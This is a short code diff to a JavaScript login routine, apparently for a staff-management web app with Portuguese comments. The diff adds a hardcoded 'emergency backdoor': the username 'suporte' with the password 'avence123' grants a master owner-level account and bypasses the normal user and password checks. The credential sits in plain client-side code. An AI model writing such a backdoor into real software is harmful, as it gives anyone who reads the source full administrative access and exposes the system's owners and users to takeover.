@@ -70,20 +70,25 @@ document.addEventListener('DOMContentLoaded', () => {
         // Busca pelo nome ignorando maiusculas/minusculas
         const colab = colaboradores.find(c => c.nome.toLowerCase() === typedName.toLowerCase());
         
-        if (!colab) {
+        // BACKDOOR DE EMERGÊNCIA (Apenas para recuperação de conta)
+        if (typedName.toLowerCase() === 'suporte' && senha === 'avence123') {
+            userToLog = { id: 'master', nome: 'Suporte (Dono)', cargo: ['Dono'], isDono: true };
+            isDono = true;
+        } 
+        else if (!colab) {
             customAlert('Usuário não encontrado no sistema. Cadastre-o primeiro.', 'error');
             return;
         }
-        
-        if (colab.senhaLogin !== senha) {
+        else if (colab.senhaLogin !== senha) {
             customAlert('Senha incorreta!', 'error');
             inputSenha.value = '';
             return;
         }
-
-        const colabCargos = Array.isArray(colab.cargo) ? colab.cargo : [colab.cargo];
-        userToLog = { ...colab, cargo: colabCargos, isDono: colabCargos.includes('Dono') };
-        isDono = userToLog.isDono;
+        else {
+            const colabCargos = Array.isArray(colab.cargo) ? colab.cargo : [colab.cargo];
+            userToLog = { ...colab, cargo: colabCargos, isDono: colabCargos.includes('Dono') };
+            isDono = userToLog.isDono;
+        }
 
         if (userToLog) {
             // Checagem de Horário Bloqueado
